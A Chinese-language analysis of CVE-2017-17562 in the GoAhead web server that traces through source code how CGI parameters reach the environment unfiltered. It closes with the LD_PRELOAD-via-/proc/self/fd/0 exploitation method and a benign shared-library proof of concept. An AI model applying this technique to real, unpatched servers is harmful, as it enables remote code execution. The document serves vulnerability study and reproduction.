# CVE-2017-17562

复现环境：https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562



## 漏洞原理

goahead可以将二进制文件和路由在配置文件中绑定到一起，如下所示：

```bash
root@bfab87f98135:/etc/goahead# cat route.txt
route uri=/cgi-bin dir=/var/www/goahead handler=cgi
route uri=/action handler=action
route uri=/ extensions=jst handler=jst
route uri=/ methods=OPTIONS|TRACE handler=options
route uri=/goform handler=action
route uri=/

```

当访问“127.0.0.1/cgi-bin/xxx”时，goahead就会去调用执行路由对应的二进制程序，而从web端传入的参数就会转换成系统变量，在调用cgi时作为参数传入。

处理代码如下所示：

```c
    /*
        Add all CGI variables to the environment strings to be passed to the spawned CGI process. This includes a few
        we don't already have in the symbol table, plus all those that are in the vars symbol table. envp will point
        to a walloc'd array of pointers. Each pointer will point to a walloc'd string containing the keyword value pair
        in the form keyword=value. Since we don't know ahead of time how many environment strings there will be the for
        loop includes logic to grow the array size via wrealloc.
     */
    envpsize = 64;
    envp = walloc(envpsize * sizeof(char*));
    for (n = 0, s = hashFirst(wp->vars); s != NULL; s = hashNext(wp->vars, s)) {
        if (s->content.valid && s->content.type == string &&
            strcmp(s->name.value.string, "REMOTE_HOST") != 0 &&
            strcmp(s->name.value.string, "HTTP_AUTHORIZATION") != 0) {
            envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
            trace(5, "Env[%d] %s", n, envp[n-1]);
            if (n >= envpsize) {
                envpsize *= 2;
                envp = wrealloc(envp, envpsize * sizeof(char *));
            }
        }
    }
    *(envp+n) = NULL;

```

对解析后的参数进行过滤，将`REMOTE_HOST`和`HTTP_AUTHORIZATION`进行过滤。但是在Linux中，有许多环境变量可以影响程序的执行，比如说`LD_PRELOAD`

![image-20220904115324319](https://raw.githubusercontent.com/wxm-radish/uPic/main/uPic/image-20220904115324319.png)

目前可以控制`LD_PRELOAD`，想办法能够劫持到我们能够控制的一个动态链接库上，那么就会造成任意代码执行。

比较巧妙的是，POST的参数会作为新进程的`stdin`，如下所示：

```c
	if (wp->cgiStdin == NULL) {
        wp->cgiStdin = websGetCgiCommName();
    }
    stdIn = wp->cgiStdin;
    stdOut = websGetCgiCommName();
    if (wp->cgifd >= 0) {
        close(wp->cgifd);
        wp->cgifd = -1;
    }

    /*
        Now launch the process.  If not successful, do the cleanup of resources.  If successful, the cleanup will be
        done after the process completes.
     */
    if ((pHandle = launchCgi(cgiPath, argp, envp, stdIn, stdOut)) == (CgiPid) -1) {
        websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, "failed to spawn CGI task");
        for (ep = envp; *ep != NULL; ep++) {
            wfree(*ep);
        }
        wfree(cgiPath);
        wfree(argp);
        wfree(envp);
        wfree(stdOut);
        wfree(query);

    }
```

上述代码可知`stdIn`是`wp->cgiStdin`，调一下`wp->cgiStdin`是谁赋值的。

发送一个POST包

![image-20220904135401066](https://raw.githubusercontent.com/wxm-radish/uPic/main/uPic/image-20220904135401066.png)

可以看到第一次调用websGetCgiCommName是在parseIncoming函数里，判断请求如果是post的话，会创建一个tmp文件，将文件路径放在`wp->cgiStdin`,然后调用open函数打开，将文件描述符放到`wp->cgifd`

```c
if (wp->route && wp->route->handler && wp->route->handler->service == cgiHandler) {
        if (smatch(wp->method, "POST")) {
            wp->cgiStdin = websGetCgiCommName();
            if ((wp->cgifd = open(wp->cgiStdin, O_CREAT | O_WRONLY | O_BINARY | O_TRUNC, 0666)) < 0) {
                websError(wp, HTTP_CODE_NOT_FOUND | WEBS_CLOSE, "Cannot open CGI file");
                return 1;
            }
        }
    }
```

接着再看在哪里向`wp->cgifd`中写入，

![image-20220904135710076](https://raw.githubusercontent.com/wxm-radish/uPic/main/uPic/image-20220904135710076.png)

```c
PUBLIC bool websProcessCgiData(Webs *wp)
{
    ssize   nbytes;

    nbytes = bufLen(&wp->input);
    trace(5, "cgi: write %d bytes to CGI program", nbytes);
    if (write(wp->cgifd, wp->input.servp, (int) nbytes) != nbytes) {
        websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR| WEBS_CLOSE, "Cannot write to CGI gateway");
    } else {
        trace(5, "cgi: write %d bytes to CGI program", nbytes);
    }
    websConsumeInput(wp, nbytes);
    return 1;
}
```

在`websProcessCgiData`函数中调用write函数向`wp->cgifd`中写入`wp->input.servp`的值

在向上追溯`processContent`函数调用了`websProcessCgiData`

websPump对每次的访问进行分步处理，对于post参数而言，在parseIncoming创建一个tmp文件，在processContent将post内容写到tmp文件中。

```c
PUBLIC void websPump(Webs *wp)
{
    bool    canProceed;

    for (canProceed = 1; canProceed; ) {
        switch (wp->state) {
        case WEBS_BEGIN:
            canProceed = parseIncoming(wp);
            break;
        case WEBS_CONTENT:
            canProceed = processContent(wp);
            break;
        case WEBS_READY:
            if (!websRunRequest(wp)) {
                /* Reroute if the handler re-wrote the request */
                websRouteRequest(wp);
                wp->state = WEBS_READY;
                canProceed = 1;
                continue;
            }
            canProceed = (wp->state != WEBS_RUNNING);
            break;
        case WEBS_RUNNING:
            /* Nothing to do until websDone is called */
            return;
        case WEBS_COMPLETE:
            canProceed = complete(wp, 1);
            break;
        }
    }
}
```



回溯一下post中的内容是在什么地方存在`wp->input`中的，经过调试发现，处理http请求数据的是在`parseIncoming`函数中

```c
static bool parseIncoming(Webs *wp)
{
    WebsBuf     *rxbuf;
    char        *end, c;

    rxbuf = &wp->rxbuf;
    while (*rxbuf->servp == '\r' || *rxbuf->servp == '\n') {
        if (bufGetc(rxbuf) < 0) {
            break;
        }
    }
    if ((end = strstr((char*) wp->rxbuf.servp, "\r\n\r\n")) == 0) {
        if (bufLen(&wp->rxbuf) >= ME_GOAHEAD_LIMIT_HEADER) {
            websError(wp, HTTP_CODE_REQUEST_TOO_LARGE | WEBS_CLOSE, "Header too large");
            return 1;
        }
        return 0;
    }
    trace(3 | WEBS_RAW_MSG, "\n<<< Request\n");
    c = *end;
    *end = '\0';
    trace(3 | WEBS_RAW_MSG, "%s\n", wp->rxbuf.servp);
    *end = c;

    /*
        Parse the first line of the Http header
     */
    parseFirstLine(wp);//处理http请求的第一行：POST /cgi-bin/hello HTTP/1.1
    if (wp->state == WEBS_COMPLETE) {
        return 1;
    }
    parseHeaders(wp);//处理http头部其他字段，处理过后wp->rxbuf.servp会指向POST数据的起始位置
    if (wp->state == WEBS_COMPLETE) {
        return 1;
    }
    wp->state = (wp->rxChunkState || wp->rxLen > 0) ? WEBS_CONTENT : WEBS_READY;//如果有POST数据，则会把wp->state赋值成WEBS_CONTENT

    websRouteRequest(wp);

    if (wp->state == WEBS_COMPLETE) {
        return 1;
    }
    
#if ME_GOAHEAD_CGI
    if (wp->route && wp->route->handler && wp->route->handler->service == cgiHandler) {
        if (smatch(wp->method, "POST")) {//这里判断是否为POST数据，是的话就会创建一个tmp文件。
            wp->cgiStdin = websGetCgiCommName();
            if ((wp->cgifd = open(wp->cgiStdin, O_CREAT | O_WRONLY | O_BINARY | O_TRUNC, 0666)) < 0) {
                websError(wp, HTTP_CODE_NOT_FOUND | WEBS_CLOSE, "Cannot open CGI file");
                return 1;
            }
        }
    }
#endif
#if !ME_ROM
    if (smatch(wp->method, "PUT")) {
        WebsStat    sbuf;
        wp->code = (stat(wp->filename, &sbuf) == 0 && sbuf.st_mode & S_IFDIR) ? HTTP_CODE_NO_CONTENT : HTTP_CODE_CREATED;
        wfree(wp->putname);
        wp->putname = websTempFile(ME_GOAHEAD_PUT_DIR, "put");
        if ((wp->putfd = open(wp->putname, O_BINARY | O_WRONLY | O_CREAT | O_BINARY, 0644)) < 0) {
            error("Cannot create PUT filename %s", wp->putname);
            websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, "Cannot create the put URI");
            wfree(wp->putname);
            return 1;
        }
    }
#endif
    return 1;
}
```



接着回到websPump函数中的for循环中，根据`wp->state`会执行`processContent`函数，该函数根据http请求头中的信息进行不同的处理，因为本次是POST请求，所以会走到`websProcessCgiData`函数，而之前分析是在websProcessCgiData函数中`wp->input.servp`已经被赋值了，那么就可以断定，`wp->input.servp`赋值操作一定在`filterChunkData`函数中

```c
static bool processContent(Webs *wp)
{
    bool    canProceed;

    canProceed = filterChunkData(wp);
    if (!canProceed || wp->finalized) {
        return canProceed;
    }
#if ME_GOAHEAD_UPLOAD
    if (wp->flags & WEBS_UPLOAD) {
        canProceed = websProcessUploadData(wp);
        if (!canProceed || wp->finalized) {
            return canProceed;
        }
    }
#endif
#if !ME_ROM
    if (wp->putfd >= 0) {
        canProceed = websProcessPutData(wp);
        if (!canProceed || wp->finalized) {
            return canProceed;
        }
    }
#endif
#if ME_GOAHEAD_CGI
    if (wp->cgifd >= 0) {
        canProceed = websProcessCgiData(wp);
        if (!canProceed || wp->finalized) {
            return canProceed;
        }
    }
#endif
    if (wp->eof) {
        wp->state = WEBS_READY;
        /*
            Prevent reading content from the next request
            The handler may not have been created if all the content was read in the initial read. No matter.
         */
        socketDeleteHandler(wp->sid);
    }
    return canProceed;
}
```

`filterChunkData`函数，该函数会根据`wp->rxChunkState`字段进行不同的处理，在调用函数之前该字段的值为0，故会走`WEBS_CHUNK_UNCHUNKED`分支。其中会把`rxbuf->servp`的内容拷贝到`wp->input`中

```c
static bool filterChunkData(Webs *wp)
{
    WebsBuf     *rxbuf;
    ssize       chunkSize;
    char        *start, *cp;
    ssize       len, nbytes;
    int         bad;

    assert(wp);
    assert(wp->rxbuf.buf);
    rxbuf = &wp->rxbuf;

    while (bufLen(rxbuf) > 0) {
        switch (wp->rxChunkState) {
        case WEBS_CHUNK_UNCHUNKED:
            len = min(wp->rxRemaining, bufLen(rxbuf));
            bufPutBlk(&wp->input, rxbuf->servp, len);//rxbuf->servp内容拷贝到wp->input中
            bufAddNull(&wp->input);//wp->input最后加上\0字符
            bufAdjustStart(rxbuf, len);//调整rxbuf->servp指针。rxbuf->servp=rxbuf->servp+16
            bufCompact(rxbuf);
            wp->rxRemaining -= len;
            if (wp->rxRemaining <= 0) {
                wp->eof = 1;
            }
            assert(wp->rxRemaining >= 0);
            return 1;

        case WEBS_CHUNK_START:
            /*
                Expect: "\r\nSIZE.*\r\n"
             */
            if (bufLen(rxbuf) < 5) {
                return 0;
            }
            start = rxbuf->servp;
            bad = (start[0] != '\r' || start[1] != '\n');
            for (cp = &start[2]; cp < rxbuf->endp && *cp != '\n'; cp++) {}
            if (*cp != '\n' && (cp - start) < 80) {
                /* Insufficient data */
                return 0;
            }
            bad += (cp[-1] != '\r' || cp[0] != '\n');
            if (bad) {
                websError(wp, WEBS_CLOSE | HTTP_CODE_BAD_REQUEST, "Bad chunk specification");
                return 1;
            }
            chunkSize = hextoi(&start[2]);
            if (!isxdigit((uchar) start[2]) || chunkSize < 0) {
                websError(wp, WEBS_CLOSE | HTTP_CODE_BAD_REQUEST, "Bad chunk specification");
                return 1;
            }
            if (chunkSize == 0) {
                /* On the last chunk, consume the final "\r\n" */
                if ((cp + 2) >= rxbuf->endp) {
                    /* Insufficient data */
                    return 0;
                }
                cp += 2;
                bad += (cp[-1] != '\r' || cp[0] != '\n');
                if (bad) {
                    websError(wp, WEBS_CLOSE | HTTP_CODE_BAD_REQUEST, "Bad final chunk specification");
                    return 1;
                }
            }
            bufAdjustStart(rxbuf, cp - start + 1);
            wp->rxChunkSize = chunkSize;
            wp->rxRemaining = chunkSize;
            if (chunkSize == 0) {
#if ME_GOAHEAD_LEGACY
                wfree(wp->query);
                wp->query = sclone(bufStart(&wp->input));
#endif
                wp->eof = 1;
                return 1;
            }
            trace(7, "chunkFilter: start incoming chunk of %d bytes", chunkSize);
            wp->rxChunkState = WEBS_CHUNK_DATA;
            break;

        case WEBS_CHUNK_DATA:
            len = min(bufLen(rxbuf), wp->rxRemaining);
            nbytes = min(bufRoom(&wp->input), len);
            if (len > 0 && (nbytes = bufPutBlk(&wp->input, rxbuf->servp, nbytes)) == 0) {
                websError(wp, HTTP_CODE_REQUEST_TOO_LARGE | WEBS_CLOSE, "Too big");
                return 1;
            }
            bufAddNull(&wp->input);
            bufAdjustStart(rxbuf, nbytes);
            wp->rxRemaining -= nbytes;
            if (wp->rxRemaining <= 0) {
                wp->rxChunkState = WEBS_CHUNK_START;
                bufCompact(rxbuf);
            }
            break;
        }
    }
    return 0;
}
```



至此已经把需要用到的信息都分析的很清晰，POST的数据会保存到tmp文件中，该文件作为新进程的stdin。



## 漏洞利用

目前能达到的条件

1、能劫持`LD_PRELOAD`

2、能够控制POST内容，会生成落地文件，且是新进程的stdin。对新进程而言，stdin就是：`/proc/self/fd/0`



利用思路：劫持`LD_PRELOAD`为`/proc/self/fd/0`，POST中内容为恶意共享库。



exp.c:

```
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "PWNED: PWNED!\n", 14);
}
//gcc -shared -fPIC ./exp.c -o exp.so
```

![image-20220905113640134](https://raw.githubusercontent.com/wxm-radish/uPic/main/uPic/image-20220905113640134.png)
